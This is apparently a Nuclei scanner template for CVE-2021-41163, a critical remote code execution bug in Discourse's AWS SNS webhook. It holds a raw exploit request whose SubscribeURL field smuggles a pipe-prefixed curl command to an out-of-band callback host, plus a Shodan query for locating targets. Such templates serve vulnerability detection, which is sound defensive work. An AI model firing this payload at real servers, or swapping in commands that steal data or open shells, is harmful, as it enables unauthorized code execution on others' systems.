id: CVE-2021-41163

info:
  name: Discourse SNS webhook RCE
  description: A validation bug in the upstream aws-sdk-sns gem can lead to RCE in Discourse via a maliciously crafted request.
  author: pdteam
  severity: critical
  reference:
    - https://0day.click/recipe/discourse-sns-rce/
    - https://twitter.com/joernchen/status/1451837477560459272
    - https://github.com/discourse/discourse/security/advisories/GHSA-jcjx-pvpc-qgwq
  tags: cve,cve2021,discourse,rce
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cve-id: CVE-2021-41163
    cwe-id: CWE-78
  metadata:
    shodan-query: 'http.component:"Discourse"'

requests:
  - raw:
      - |
        POST /webhooks/aws HTTP/2
        Host: {{Hostname}}
        Accept: */*
        Content-Type: application/x-www-form-urlencoded
        
        {"Type":"SubscriptionConfirmation","MessageId":"9709c2a9-740a-5bd1-a1bc-9b47fb526eb5","SubscribeURL":"|curl http://c5s44clmmud889rtlcp0cfhrrcayyyyyn.interactsh.com","SignatureVersion":"1","Signature":"Tleh8Gm49kSzw97KpiUZ3Iq8Rc0hyiF0gwrCkLJO9IrXNj83UHWpmAgDBbIIRQWSWezBkR0w3Cc0TqkhzR72XE2t8p1+NH+16D1j5Pxx9ho0Vxg5YkXxTnUt/sLAzEIPyJl/mum1EnRoVzRIzHva2sdPEJ9tcRezm1FX4O+q3S0COjZwxrtjYtu0bckPrSpnQBob1+HGbgOPpFUvLDP42zAqJOcgg7eiMjXZ03ZGAu3L/PADMUlEnIk7T1/LrjCITQSjPoP2kIo16ehJ+PIspghfWC6g7LZNJZlQtLe+Ur+KBSpZvUTHLjMC3mUsk8UWRXW3xxTS68B6iCJ1aFCylw==","SigningCertURL":"https://sns.us-east-1.amazonaws.com/xkcqMlwGkmT.pem?Action=GetEndpointAttributes&EndpointArn=arn%3Aaws%3Asns%3Aus-east-1%3A856765825203%3Aendpoint%2FGCM%2Fxmeng%2F144f2214-061a-3176-b586-138e3b420071&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIA4O6ZZACZ47KOAI5K%2F20211026%2Fus-east-1%2Fsns%2Faws4_request&X-Amz-Date=20211026T185051Z&X-Amz-Expires=6000&X-Amz-SignedHeaders=host&X-Amz-Signature=d26af563fb2d4ae1d3aee381f7172f3c8666a34202a7305aab15d1768d4c4939"}
    matchers:
      - type: status
        status:
          - 200

    # TODO, more unique matchers and payload update